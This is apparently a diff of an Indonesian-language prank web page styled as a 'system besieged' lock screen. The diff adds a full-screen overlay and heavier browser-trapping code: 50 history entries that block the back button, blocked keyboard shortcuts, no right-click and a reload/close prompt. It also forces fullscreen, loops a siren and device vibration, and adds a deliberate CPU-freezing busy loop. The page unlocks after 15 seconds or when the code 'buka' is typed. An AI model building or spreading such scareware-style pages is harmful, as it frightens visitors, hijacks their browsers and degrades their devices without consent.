@@ -5,91 +5,112 @@
   <meta charset="UTF-8" />
   <style>
     * { user-select: none; }
-    body {
+    html, body {
+      margin: 0;
+      padding: 0;
       background: black;
       color: lime;
       font-family: monospace;
-      text-align: center;
-      padding: 50px;
       overflow: hidden;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
     input {
-      padding: 10px;
       font-size: 18px;
-      margin-top: 20px;
-      border: none;
-      border-radius: 5px;
+      padding: 10px;
       background: #111;
       color: lime;
+      border: none;
+      border-radius: 4px;
+      margin-top: 20px;
       outline: none;
     }
     input:disabled {
       background: #333;
     }
+    #freeze {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 9999;
+      background: rgba(0,0,0,0.95);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
   </style>
 </head>
 <body>
-  <h1>🛑 SISTEM TERKEPUNG</h1>
-  <p id="info">Tunggu 15 detik atau masukkan kode rahasia untuk keluar...</p>
-  <input type="text" id="kode" placeholder="Masukkan kode" autofocus />
+  <div id="freeze">
+    <h1>🛑 SISTEM TERKEPUNG</h1>
+    <p id="info">Tunggu 15 detik atau masukkan kode rahasia untuk keluar...</p>
+    <input type="text" id="kode" placeholder="Masukkan kode" autofocus />
+  </div>
 
   <audio id="sirine" loop>
     <source src="https://www.soundjay.com/misc/sounds/emergency-buzzer-1.mp3" type="audio/mpeg" />
   </audio>
 
   <script>
-    const kodeRahasia = "bima";
+    const kodeRahasia = "buka";
     let isLocked = true;
     let timer = 15;
     const input = document.getElementById("kode");
     const info = document.getElementById("info");
     const sirine = document.getElementById("sirine");
 
-    // 1. Loop history supaya back gagal
-    for (let i = 0; i < 20; i++) history.pushState(null, "", location.href);
+    // LOOP SPAM history supaya back gagal
+    for (let i = 0; i < 50; i++) history.pushState(null, "", location.href);
     window.onpopstate = () => {
       if (isLocked) history.pushState(null, "", location.href);
     };
 
-    // 2. Blok semua keyboard kecuali input
-    document.addEventListener("keydown", e => {
-      if (isLocked && e.target !== input) {
-        e.preventDefault();
-      }
+    // Cegah reload & close tab
+    window.onbeforeunload = () => isLocked ? "Tunggu sistem terbuka!" : null;
 
-      // Blok F12, Ctrl+R, F5, Esc
-      if (["F12", "F5", "Escape"].includes(e.key) || (e.ctrlKey && e.key.toLowerCase() === "r")) {
+    // Cegah shortcut keyboard
+    document.addEventListener("keydown", e => {
+      if (isLocked && e.target !== input) e.preventDefault();
+
+      if (
+        ["F1","F5","F12","Escape"].includes(e.key) ||
+        (e.ctrlKey && ["r","w","s","p","u"].includes(e.key.toLowerCase()))
+      ) {
         if (isLocked) e.preventDefault();
       }
     });
 
-    // 3. Cegah klik kanan
+    // Cegah klik kanan
     document.addEventListener("contextmenu", e => isLocked && e.preventDefault());
 
-    // 4. Auto fullscreen pas interaksi pertama
-    const enableFullscreen = () => {
+    // Auto fullscreen pas klik/touch
+    const fs = () => {
       const el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if (el.msRequestFullscreen) el.msRequestFullscreen();
     };
+    document.addEventListener("click", fs, { once: true });
+    document.addEventListener("touchstart", fs, { once: true });
 
-    document.addEventListener("click", enableFullscreen, { once: true });
-    document.addEventListener("touchstart", enableFullscreen, { once: true });
-
-    // 5. Vibrasi terus
+    // Vibrasi loop
     const vibrateInterval = setInterval(() => {
       if (navigator.vibrate && isLocked) navigator.vibrate([200]);
-    }, 1200);
+    }, 1000);
 
-    // 6. Sirine
+    // Sirine
     setTimeout(() => {
       sirine.play().catch(() => {
-        info.textContent += " (tap layar utk aktifkan suara)";
+        info.textContent += " (tap layar dulu buat aktifkan audio)";
       });
-    }, 300);
+    }, 500);
 
-    // 7. Countdown
+    // Hitung mundur
     const countdown = setInterval(() => {
       if (!isLocked) return;
       if (timer <= 0) {
@@ -100,12 +121,21 @@
       }
     }, 1000);
 
-    // 8. Deteksi kode
+    // Kode rahasia
     input.addEventListener("input", () => {
       if (input.value.trim().toLowerCase() === kodeRahasia.toLowerCase()) unlock();
     });
 
-    // 9. Fungsi Unlock
+    // Fake freeze (loop blocking dummy)
+    const freezeCPU = () => {
+      let x = 0;
+      const limit = Date.now() + 2000;
+      while (Date.now() < limit) { x += Math.random(); }
+      requestAnimationFrame(freezeCPU);
+    };
+    freezeCPU(); // bikin device berat
+
+    // UNLOCK
     function unlock() {
       isLocked = false;
       clearInterval(countdown);
@@ -114,13 +144,9 @@
       sirine.currentTime = 0;
       window.onbeforeunload = null;
 
-      document.querySelector("h1").textContent = "✅ Sistem Terbuka";
-      info.textContent = "Lo sekarang bebas... untuk mikir ulang buka web ini 🗿";
-      input.disabled = true;
+      document.getElementById("freeze").remove();
+      alert("✅ Sistem telah dibuka. Lu selamat bro.");
     }
-
-    // 10. Blok reload/close tab
-    window.onbeforeunload = () => (isLocked ? "Tunggu sistem selesai!" : null);
   </script>
 </body>
 </html>
